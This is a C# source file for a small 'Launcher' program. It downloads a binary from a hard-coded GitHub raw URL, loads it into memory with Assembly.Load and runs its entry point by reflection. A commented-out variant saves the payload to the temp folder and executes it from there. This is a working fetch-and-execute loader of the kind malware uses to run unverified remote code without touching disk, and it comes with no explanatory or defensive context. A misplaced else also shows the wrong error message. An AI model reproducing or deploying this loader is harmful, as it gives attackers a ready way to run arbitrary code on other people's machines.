﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Launcher
{
    class Program
    {

        static byte[] download( string url )
        {
            WebClient web = new WebClient();
            return web.DownloadData( url );
        }

        static bool load( byte[] assemblybuffer )
        {
            Assembly assembly = Assembly.Load( assemblybuffer );
            MethodInfo method = assembly.EntryPoint;
            if (method != null) {

                object o = assembly.CreateInstance( method.ReflectedType.Name );
                method.Invoke( o, new object[0] );
                return true;
            } else
                return false;
        }

        static void Main( string[] args )
        {

            string url = "https://github.com/ostway/bin/raw/master/pbpb";

            byte[] buffer = download(url);

            if (buffer.Length > 100)
                if (!load( buffer)) 
                    MessageBox.Show("Can't invoke :(");
            else 
                MessageBox.Show("Can't download :(");


            //WebClient web = new WebClient();
            //buffer = web.DownloadData(url);

            //load(buffer);

            //if (!SnLib.SNet.DownloadFile( url, out buffer )) {

            //    MessageBox.Show("Can't download :(");
            //    return;
            //}

            //string hash = SCrypt.CalculateMD5(buffer);

            //string filename = Path.GetTempPath() + hash;

            //if (!File.Exists(filename)) 

            //    using (BinaryWriter Writer = new BinaryWriter( File.OpenWrite( filename ) )) {

            //        Writer.Write( buffer );
            //        Writer.Flush();
            //        Writer.Close();
            //    }

            //SnLib.SReflection.LoadAssemblyAndInvokeEntryPoint( ref buffer, null );
            // AppDomain.CurrentDomain.ExecuteAssembly( filename );

        }

    }
}
